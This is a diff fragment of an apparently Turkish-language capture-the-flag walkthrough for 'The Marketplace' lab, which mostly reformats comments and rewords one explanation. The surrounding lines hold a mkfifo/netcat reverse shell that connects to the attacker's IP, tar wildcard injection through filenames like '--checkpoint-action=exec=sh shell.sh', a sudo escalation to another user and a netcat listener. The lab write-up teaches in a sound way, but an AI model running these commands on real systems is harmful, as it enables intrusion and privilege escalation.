@@ -260,13 +260,13 @@ cat > /opt/backups/shell.sh << EOF
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc (kendi ip adresini yaz) 4444 >/tmp/f 
 EOF      
 ```
-Bu komut sayesinde cihazımıza shell gönderilecek.
+
 
 ```
-jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh     //yazdığımız shell.sh dosyasına okuma+yazma+değiştirme yetkisini veriyoruz.
-jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"  //checkpoint noktası oluşturuyoruz.
-jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh" // oluşturduğumuz checkpoint noktasının eylemini belirtiyoruz.
-jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh   //michael adında backup dosyamızı çalıştırıyoruz.
+jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh                              //yazdığımız shell.sh dosyasına okuma+yazma+değiştirme yetkisini veriyoruz.
+jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"                         //checkpoint noktası oluşturuyoruz.
+jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"   // oluşturduğumuz checkpoint noktasının eylemini belirtiyoruz.
+jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh                      //michael adında backup dosyamızı çalıştırıyoruz.
 ```
 Çalıştırmadan önce kendi terminalinizde "nc listener" açın : 
 
@@ -277,7 +277,7 @@ melami㉿Melami> nc -lvnp 4444
 
 Tekrar ssh bağlantısına geri dönün. Kodu çalıştırmadan önce backup.tar dosyasını silin.
 
-Çünkü backup.sh dosyası backup.tar ı bulamazsa aynı klasördeki diğer dosyaları çalıştıracaktır(yani bizim dosyamızı)
+Çünkü backup.sh dosyası çalıştığında backup.tar dosyasını bulamayınca aynı dizinde bulunan bizim belirttiğimiz dosyayı çalıştıracaktır.
 
 ```
 rm backup.tar
